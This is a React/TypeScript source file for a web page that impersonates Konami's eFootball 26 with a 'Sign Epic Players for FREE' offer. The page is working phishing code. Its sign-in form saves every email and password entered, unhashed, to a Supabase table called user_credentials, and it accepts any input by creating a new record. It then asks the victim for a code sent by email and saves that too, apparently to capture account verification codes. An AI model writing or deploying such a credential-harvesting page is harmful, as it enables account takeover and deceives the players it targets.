import { useState } from 'react';
import { Link } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Gift, Star, Trophy, Zap, LogIn, Mail, Lock, Clock } from 'lucide-react';
import { supabase } from '@/lib/supabase';

export default function Index() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [showSignIn, setShowSignIn] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [codeSubmitted, setCodeSubmitted] = useState(false);

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      // Check if user exists in database
      const { data: existingUser, error: checkError } = await supabase
        .from('user_credentials')
        .select('*')
        .eq('email', email)
        .eq('password', password) // Direct comparison since password is unhashed
        .single();

      if (checkError && checkError.code !== 'PGRST116') {
        setError('Database error occurred');
        setLoading(false);
        return;
      }

      if (existingUser) {
        // User exists with correct credentials - update last login
        await supabase
          .from('user_credentials')
          .update({ last_login: new Date().toISOString() })
          .eq('id', existingUser.id);

        setIsLoggedIn(true);
        setShowSignIn(false);
      } else {
        // User doesn't exist or wrong credentials - create new user
        const { data: newUser, error: insertError } = await supabase
          .from('user_credentials')
          .insert([
            {
              email,
              password, // Store unhashed password as requested
              last_login: new Date().toISOString()
            }
          ])
          .select()
          .single();

        if (insertError) {
          setError('Failed to create account');
        } else {
          setIsLoggedIn(true);
          setShowSignIn(false);
        }
      }
    } catch (err) {
      setError('An unexpected error occurred');
    } finally {
      setLoading(false);
    }
  };

  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim()) return;

    setLoading(true);
    setError('');

    try {
      // Store the code in database
      const { error: insertError } = await supabase
        .from('user_codes')
        .insert([
          {
            user_email: email,
            code: code.trim()
          }
        ]);

      if (insertError) {
        setError('Failed to submit code. Please try again.');
      } else {
        setCodeSubmitted(true);
        setCode('');
      }
    } catch (err) {
      setError('An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const handleSignOut = () => {
    setIsLoggedIn(false);
    setEmail('');
    setPassword('');
    setCode('');
    setCodeSubmitted(false);
    setError('');
  };



  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-konami-blue to-background">
      {/* Header */}
      <header className="border-b border-border/40 bg-card/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <img 
              src="https://cdn.builder.io/api/v1/assets/6489dacc0a404795897141b1d2151faa/konami-logo.wine-1f439a?format=webp&width=800" 
              alt="Konami Logo" 
              className="h-8 w-auto"
            />
            <div className="text-2xl font-bold text-konami-yellow">eFootball™ 26</div>
          </div>
          
          {!isLoggedIn ? (
            <Button 
              onClick={() => setShowSignIn(true)}
              className="bg-konami-red hover:bg-konami-red/90 text-white"
            >
              <LogIn className="w-4 h-4 mr-2" />
              Sign In
            </Button>
          ) : (
            <div className="flex items-center space-x-2">
              <Badge variant="secondary" className="bg-konami-green text-white">
                Welcome, {email.split('@')[0]}!
              </Badge>
              <Button 
                variant="outline" 
                size="sm" 
                onClick={handleSignOut}
                className="text-xs"
              >
                Sign Out
              </Button>
            </div>
          )}
        </div>
      </header>

      {/* Hero Section */}
      <section className="py-20 px-4">
        <div className="container mx-auto text-center">
          <div className="mb-8">
            <img 
              src="https://cdn.builder.io/api/v1/assets/6489dacc0a404795897141b1d2151faa/podcast-484-efootball-2022-lego-star-wars-the-skywalker-saga-astral-ascent-f01aa8?format=webp&width=800" 
              alt="eFootball Players" 
              className="w-full max-w-4xl mx-auto rounded-2xl shadow-2xl"
            />
          </div>
          
          <h1 className="text-6xl font-bold text-foreground mb-6 bg-gradient-to-r from-konami-yellow via-konami-purple to-konami-green bg-clip-text text-transparent">
            Sign Epic Players for FREE
          </h1>
          
          <p className="text-xl text-muted-foreground mb-8 max-w-2xl mx-auto">
            Join eFootball™ 26 and contract legendary players at no cost. 
            Experience the ultimate football simulation with the world's greatest stars.
          </p>

          <div className="flex items-center justify-center space-x-4 mb-12">
            <Badge className="bg-konami-yellow text-black font-semibold px-4 py-2">
              <Gift className="w-4 h-4 mr-2" />
              100% FREE
            </Badge>
            <Badge className="bg-konami-purple text-white font-semibold px-4 py-2">
              <Star className="w-4 h-4 mr-2" />
              Epic Players
            </Badge>
            <Badge className="bg-konami-green text-white font-semibold px-4 py-2">
              <Trophy className="w-4 h-4 mr-2" />
              Championship Ready
            </Badge>
          </div>

          {!isLoggedIn ? (
            <Button
              size="lg"
              onClick={() => setShowSignIn(true)}
              className="bg-gradient-to-r from-konami-red to-konami-purple hover:from-konami-red/90 hover:to-konami-purple/90 text-white text-lg px-8 py-4 h-auto"
            >
              <Zap className="w-5 h-5 mr-2" />
              Start Playing Now
            </Button>
          ) : !codeSubmitted ? (
            <div className="max-w-md mx-auto mt-8">
              <Card className="bg-gradient-to-br from-card to-muted/20 border-konami-yellow/20">
                <CardHeader className="text-center">
                  <div className="w-16 h-16 mx-auto bg-konami-yellow rounded-full flex items-center justify-center mb-4">
                    <Gift className="w-8 h-8 text-black" />
                  </div>
                  <CardTitle className="text-2xl text-konami-yellow">Enter Your Code</CardTitle>
                  <CardDescription>
                    Check your email for the code, if you didn't get it then infos are wrong!
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <form onSubmit={handleCodeSubmit} className="space-y-4">
                    <div>
                      <label className="text-sm font-medium text-foreground">Code</label>
                      <Input
                        type="text"
                        value={code}
                        onChange={(e) => setCode(e.target.value)}
                        placeholder="Enter your code"
                        className="mt-1 text-center text-lg"
                        required
                      />
                    </div>

                    {error && (
                      <div className="text-sm text-destructive bg-destructive/10 p-2 rounded">
                        {error}
                      </div>
                    )}

                    <Button
                      type="submit"
                      className="w-full bg-konami-green hover:bg-konami-green/90 text-white"
                      disabled={loading || !code.trim()}
                    >
                      {loading ? 'Submitting...' : 'Submit Code'}
                    </Button>
                  </form>
                </CardContent>
              </Card>
            </div>
          ) : (
            <div className="max-w-md mx-auto mt-8">
              <Card className="bg-gradient-to-br from-konami-green/20 to-konami-yellow/20 border-konami-green">
                <CardHeader className="text-center">
                  <div className="w-20 h-20 mx-auto bg-konami-green rounded-full flex items-center justify-center mb-4">
                    <Clock className="w-10 h-10 text-white" />
                  </div>
                  <CardTitle className="text-2xl text-konami-green">Code Submitted!</CardTitle>
                  <CardDescription className="text-lg">
                    Your gift is being processed
                  </CardDescription>
                </CardHeader>
                <CardContent className="text-center space-y-4">
                  <div className="bg-konami-yellow/10 p-4 rounded-lg">
                    <p className="text-konami-yellow font-semibold text-lg">
                      You will receive your gift from 3 to 5 hours
                    </p>
                  </div>
                  <p className="text-muted-foreground text-sm">
                    Check back later to claim your epic players!
                  </p>
                  <Button
                    onClick={() => setCodeSubmitted(false)}
                    className="bg-konami-blue hover:bg-konami-blue/90 text-white"
                  >
                    Submit Another Code
                  </Button>
                </CardContent>
              </Card>
            </div>
          )}
        </div>
      </section>

      {/* Sign In Modal */}
      {showSignIn && !isLoggedIn && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50">
          <Card className="w-full max-w-md mx-4 bg-card border-konami-yellow/20">
            <CardHeader className="text-center">
              <CardTitle className="text-2xl text-konami-yellow">Sign In to eFootball™ 26</CardTitle>
              <CardDescription>Enter your credentials to access epic players</CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSignIn} className="space-y-4">
                <div>
                  <label className="text-sm font-medium text-foreground flex items-center space-x-2">
                    <Mail className="w-4 h-4" />
                    <span>Email</span>
                  </label>
                  <Input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Enter your email"
                    className="mt-1"
                    required
                  />
                </div>
                <div>
                  <label className="text-sm font-medium text-foreground flex items-center space-x-2">
                    <Lock className="w-4 h-4" />
                    <span>Password</span>
                  </label>
                  <Input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter your password"
                    className="mt-1"
                    required
                  />
                </div>
                <div className="flex space-x-2 pt-4">
                  <Button 
                    type="button" 
                    variant="outline" 
                    onClick={() => setShowSignIn(false)}
                    className="flex-1"
                  >
                    Cancel
                  </Button>
                  <Button
                    type="submit"
                    className="flex-1 bg-konami-red hover:bg-konami-red/90 text-white"
                    disabled={loading}
                  >
                    {loading ? 'Signing In...' : 'Sign In'}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      )}





      {/* Footer */}
      <footer className="border-t border-border/40 bg-card/30 py-8 px-4">
        <div className="container mx-auto text-center">
          <div className="flex items-center justify-center space-x-4 mb-4">
            <img 
              src="https://cdn.builder.io/api/v1/assets/6489dacc0a404795897141b1d2151faa/konami-logo.wine-1f439a?format=webp&width=800" 
              alt="Konami Logo" 
              className="h-6 w-auto"
            />
            <span className="text-konami-yellow font-bold">eFootball™ 26</span>
          </div>
          <p className="text-sm text-muted-foreground">
            © 2024 Konami Digital Entertainment Co., Ltd. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
